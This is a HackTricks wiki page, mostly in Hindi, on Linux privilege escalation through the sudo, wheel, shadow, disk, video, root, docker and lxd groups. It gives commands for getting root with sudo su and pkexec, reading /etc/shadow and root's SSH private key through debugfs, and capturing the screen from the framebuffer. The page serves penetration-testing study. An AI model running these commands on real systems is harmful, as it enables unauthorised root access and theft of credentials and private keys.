{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

# Sudo/Admin Groups

## **PE - Method 1**

**कभी-कभी**, **डिफ़ॉल्ट रूप से \(या क्योंकि कुछ सॉफ़्टवेयर को इसकी आवश्यकता होती है\)** **/etc/sudoers** फ़ाइल के अंदर आप इनमें से कुछ पंक्तियाँ पा सकते हैं:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
यह मतलब है कि **कोई भी उपयोगकर्ता जो sudo या admin समूह का सदस्य है, वह sudo के रूप में कुछ भी निष्पादित कर सकता है**।

यदि ऐसा है, तो **रूट बनने के लिए आप बस निष्पादित कर सकते हैं**:
```text
sudo su
```
## PE - Method 2

सभी suid बाइनरी खोजें और जांचें कि क्या बाइनरी **Pkexec** है:
```bash
find / -perm -4000 2>/dev/null
```
यदि आप पाते हैं कि बाइनरी pkexec एक SUID बाइनरी है और आप sudo या admin के सदस्य हैं, तो आप संभवतः pkexec का उपयोग करके sudo के रूप में बाइनरी निष्पादित कर सकते हैं। इसकी सामग्री की जांच करें:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
वहाँ आप पाएंगे कि कौन से समूह **pkexec** निष्पादित करने की अनुमति रखते हैं और **डिफ़ॉल्ट रूप से** कुछ लिनक्स में **sudo या admin** के कुछ समूह **प्रकट** हो सकते हैं।

**रूट बनने के लिए आप निष्पादित कर सकते हैं**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
यदि आप **pkexec** निष्पादित करने की कोशिश करते हैं और आपको यह **त्रुटि** मिलती है:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**यह इसलिए नहीं है कि आपके पास अनुमतियाँ नहीं हैं बल्कि इसलिए कि आप GUI के बिना जुड़े नहीं हैं**। और इस समस्या का एक समाधान यहाँ है: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)। आपको **2 अलग ssh सत्र** की आवश्यकता है:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# व्हील समूह

**कभी-कभी**, **डिफ़ॉल्ट रूप से** **/etc/sudoers** फ़ाइल के अंदर आप यह पंक्ति पा सकते हैं:
```text
%wheel	ALL=(ALL:ALL) ALL
```
यह मतलब है कि **कोई भी उपयोगकर्ता जो समूह व्हील का सदस्य है, वह sudo के रूप में कुछ भी निष्पादित कर सकता है**।

यदि ऐसा है, तो **रूट बनने के लिए आप बस निष्पादित कर सकते हैं**:
```text
sudo su
```
# Shadow Group

**शैडो** समूह के उपयोगकर्ता **/etc/shadow** फ़ाइल को **पढ़** सकते हैं:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, read the file and try to **crack some hashes**.

# Disk Group

यह विशेषाधिकार लगभग **रूट एक्सेस के बराबर** है क्योंकि आप मशीन के अंदर सभी डेटा तक पहुँच सकते हैं।

Files:`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
ध्यान दें कि debugfs का उपयोग करके आप **फाइलें लिख** भी सकते हैं। उदाहरण के लिए, `/tmp/asd1.txt` को `/tmp/asd2.txt` में कॉपी करने के लिए आप कर सकते हैं:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
हालांकि, यदि आप **रूट द्वारा स्वामित्व वाले फ़ाइलें लिखने** की कोशिश करते हैं \(जैसे `/etc/shadow` या `/etc/passwd`\) तो आपको "**अनुमति अस्वीकृत**" त्रुटि मिलेगी।

# वीडियो समूह

कमांड `w` का उपयोग करके आप **जान सकते हैं कि कौन सिस्टम पर लॉग इन है** और यह निम्नलिखित आउटपुट दिखाएगा:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
The **tty1** का मतलब है कि उपयोगकर्ता **yossi शारीरिक रूप से** मशीन पर एक टर्मिनल में लॉग इन है।

**video group** को स्क्रीन आउटपुट देखने का अधिकार है। मूल रूप से आप स्क्रीन को देख सकते हैं। ऐसा करने के लिए, आपको **स्क्रीन पर वर्तमान छवि को** कच्चे डेटा में प्राप्त करना होगा और यह जानना होगा कि स्क्रीन किस रिज़ॉल्यूशन का उपयोग कर रही है। स्क्रीन डेटा को `/dev/fb0` में सहेजा जा सकता है और आप इस स्क्रीन का रिज़ॉल्यूशन `/sys/class/graphics/fb0/virtual_size` पर पा सकते हैं।
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
To **open** the **raw image** you can use **GIMP**, select the **`screen.raw`** file and select as file type **Raw image data**:

![](../../.gitbook/assets/image%20%28208%29.png)

Then modify the Width and Height to the ones used on the screen and check different Image Types \(and select the one that shows better the screen\):

![](../../.gitbook/assets/image%20%28295%29.png)

# Root Group

ऐसा लगता है कि डिफ़ॉल्ट रूप से **रूट समूह के सदस्य** कुछ **सेवा** कॉन्फ़िगरेशन फ़ाइलों या कुछ **लाइब्रेरी** फ़ाइलों या **अन्य दिलचस्प चीजों** को **संशोधित** करने तक पहुँच प्राप्त कर सकते हैं जो विशेषाधिकार बढ़ाने के लिए उपयोग की जा सकती हैं...

**जांचें कि रूट सदस्य कौन सी फ़ाइलें संशोधित कर सकते हैं**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker Group

आप होस्ट मशीन के रूट फाइल सिस्टम को एक इंस्टेंस के वॉल्यूम में माउंट कर सकते हैं, इसलिए जब इंस्टेंस शुरू होता है, तो यह तुरंत उस वॉल्यूम में `chroot` लोड करता है। यह प्रभावी रूप से आपको मशीन पर रूट देता है।

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd Group

[lxc - Privilege Escalation](lxd-privilege-escalation.md)


<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) का उपयोग करें ताकि आप आसानी से **वर्कफ़्लो** बना सकें और **स्वचालित** कर सकें जो दुनिया के **सबसे उन्नत** सामुदायिक उपकरणों द्वारा संचालित हैं।\
आज ही एक्सेस प्राप्त करें:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **जुड़ें** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर **फॉलो** करें।**
* हैकिंग ट्रिक्स साझा करें और [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}
